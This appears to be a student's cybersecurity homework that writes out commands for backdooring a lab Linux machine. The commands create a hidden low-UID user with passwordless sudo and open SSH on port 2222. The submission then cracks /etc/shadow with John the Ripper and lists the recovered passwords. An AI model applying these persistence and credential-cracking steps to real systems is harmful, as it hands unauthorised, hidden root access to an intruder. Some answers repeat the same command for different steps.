**Week 6 Homework Submission File: Advanced Bash - Owning the System**

**Step 1: Shadow People**

1. Create a secret user named sysd. Make sure this user doesn't have a home folder created:

﻿**useradd -u 111 -g 111 sysd**

1. Give your secret user a password:

﻿**passwd sysd**

1. Give your secret user a system UID < 1000:

﻿ **useradd -u 111 -g 111 sysd**

1. Give your secret user the same GID:

**useradd -u 111 -g 111 sysd**

1. Give your secret user full sudo access without the need for a password:

﻿	**nano /etc/sudoers** 

`	`**﻿sysd  ALL=(ALL:ALL) NOPASSWD: ALL**

1. Test that sudo access works without your password:

**sudo id** 









**Step 2: Smooth Sailing**

1. Edit the sshd\_config file:

` `**nano /etc/ssh/sshd\_config**

﻿**Port 22**

**Port 2222**



**Step 3: Testing Your Configuration Update**

1. Restart the SSH service:

﻿**systemctl restart sshd**

1. Exit the root account:

**exit**

1. SSH to the target machine using your sysd account and port 2222:

﻿**ssh sysd@192.168.6.105 -p 2222**

1. Use sudo to switch to the root user:

**sudo -s**







**Step 4: Crack All the Passwords**

1. SSH back to the system using your sysd account and port 2222:

**ssh sysd@192.168.6.105 -p 2222**

1. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:

﻿**sudo john /etc/shadow**

﻿**computer         (stallman)**

**freedom          (babbage)**

**trustno1         (mitnik)**

**dragon           (lovelace)**

**lakers            (turing)**

**passw0rd      (sysadmin)**

**cyber             (sysd)**
